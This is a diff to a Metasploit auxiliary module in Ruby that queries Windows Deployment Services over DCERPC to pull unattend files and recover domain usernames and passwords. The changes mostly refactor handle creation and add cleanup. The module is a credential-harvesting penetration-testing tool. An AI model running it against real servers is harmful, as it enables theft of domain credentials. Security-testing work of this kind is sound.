@@ -62,9 +62,10 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def query_host(rhost)
-    # Create a handler with our UUID and Transfer Syntax
-
+  # Create a handler with our UUID and Transfer Syntax
+  def create_dcerpc_handle
+    # Never reuse a handle, this can block the WDS server
+    clear_dcerpc_handle
     self.handle = Rex::Proto::DCERPC::Handle.new(
       [
         WDS_CONST::WDSCP_RPC_UUID,
@@ -74,19 +75,30 @@ class Metasploit3 < Msf::Auxiliary
       rhost,
       [datastore['RPORT']]
     )
-
-    print_status("Binding to #{handle} ...")
-
     self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
-    print_good("Bound to #{handle}")
+    if self.dcerpc.socket
+      report_service(
+        :host => rhost,
+        :port => datastore['RPORT'],
+        :proto => 'tcp',
+        :name => "dcerpc",
+        :info => "#{WDS_CONST::WDSCP_RPC_UUID} v1.0 Windows Deployment Services"
+      )
+    end
+    return self.dcerpc
+  end
 
-    report_service(
-      :host => rhost,
-      :port => datastore['RPORT'],
-      :proto => 'tcp',
-      :name => "dcerpc",
-      :info => "#{WDS_CONST::WDSCP_RPC_UUID} v1.0 Windows Deployment Services"
-    )
+  def clear_dcerpc_handle
+    disconnect
+    if self.handle
+      self.handle = nil
+      self.dcerpc = nil
+      self.sock.close rescue nil
+      self.sock = nil
+    end
+  end
+
+  def query_host(rhost)
 
     table = Rex::Ui::Text::Table.new({
       'Header' => 'Windows Deployment Services',
@@ -95,19 +107,22 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     creds_found = false
-
     WDS_CONST::ARCHITECTURE.each do |architecture|
+
       if architecture[0] == :ARM && !datastore['ENUM_ARM']
         vprint_status "Skipping #{architecture[0]} architecture due to adv option"
         next
       end
+
+      print_status "Asking for architecture #{architecture[0]}"
+      print_good("Bound to #{handle}") if create_dcerpc_handle
 
       begin
         result = request_client_unattend(architecture)
       rescue ::Rex::Proto::DCERPC::Exceptions::Fault => e
         vprint_error(e.to_s)
         print_error("#{rhost} DCERPC Fault - Windows Deployment Services is present but not configured. Perhaps an SCCM installation.")
-        return
+        return nil
       end
 
       unless result.nil?
@@ -116,7 +131,7 @@ class Metasploit3 < Msf::Auxiliary
 
         results.each do |result|
           unless result.empty?
-            unless result['username'].nil? || result['password'].nil?
+            if result['username'] && result['password']
               print_good("Retrived #{result['type']} credentials for #{architecture[0]}")
               creds_found = true
               domain = ""
@@ -223,4 +238,11 @@ class Metasploit3 < Msf::Auxiliary
       :user => "#{domain}\\#{user}",
       :pass => pass)
   end
+
+  # These DCERPC handles can hang around, so explicitly disconnect.
+  def cleanup
+    clear_dcerpc_handle
+    super
+  end
+
 end
